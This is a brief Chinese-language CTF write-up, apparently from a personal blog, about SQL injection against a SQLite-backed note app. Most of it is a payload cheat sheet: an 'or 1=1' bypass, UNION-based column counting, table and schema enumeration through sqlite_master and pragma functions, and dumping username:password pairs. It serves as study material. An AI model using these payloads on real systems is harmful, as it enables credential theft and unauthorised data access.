---
title: "Notely - Internal Note Management System"
date: 2026-10-18T19:31:08+08:00
weight: 298
draft: false
---

学习了sqlite的sql注入。
开局’or 1=1 --+没什么好说的

后面尝试爆database()，显示没有这样的语法，说明不是mysql，可能是sqlite。


积累一些sqlite语句。

```sqlite
-- 1. 列数：从 1 试到报错
' order by 4 -- 
--   SQLite 报错信息很直白：1st ORDER BY term out of range - should be between 1 and 4

-- 2. 显示位
' union all select 1,2,3,4 -- 

-- 3. 版本 + 库文件
' union all select 1,2,sqlite_version(),4 -- 
' union all select 1,2,(select file from pragma_database_list),4 -- 

-- 4. 所有表名
' union all select 1,2,(select group_concat(name) from sqlite_master where type='table'),4 -- 
--   含视图就把 type='table' 换成 type in ('table','view')；想排除内部表加 and name not like 'sqlite_%'

-- 5. 某张表的字段
' union all select 1,2,(select group_concat(name) from pragma_table_info('users')),4 -- 
--   或者一步到位看建表语句（列名+类型+约束全在里面）：
' union all select 1,2,(select sql from sqlite_master where name='users'),4 -- 

-- 6. 拖数据
' union all select 1,2,(select group_concat(username||':'||password) from users),4 -- 
--   数据多、显示位窄就配合 substr / limit offset 分段：
' union all select 1,2,(select password from users limit 1 offset 0),4 -- 
```

### ~~不要乱裁员~~
